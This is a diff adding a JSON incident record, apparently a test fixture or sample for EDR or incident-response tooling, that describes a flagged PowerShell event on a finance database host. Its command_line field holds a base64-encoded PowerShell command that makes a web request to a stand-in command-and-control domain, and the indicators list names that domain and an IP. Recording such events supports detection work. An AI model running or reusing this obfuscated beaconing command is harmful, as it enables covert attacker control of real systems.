@@ -1,0 +1,9 @@
+{
+  "incident_id": "INC-2041",
+  "hostname": "FIN-SQL01",
+  "user": "asingh",
+  "process_name": "powershell.exe",
+  "command_line": "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAMgAtAHAAYQBuAGUAbAAuAGkAbwA=",
+  "indicators": ["185.220.101.7", "evil-c2-panel.io"],
+  "description": "EDR flagged an encoded PowerShell command beaconing out shortly after an interactive login on the finance database host."
+}
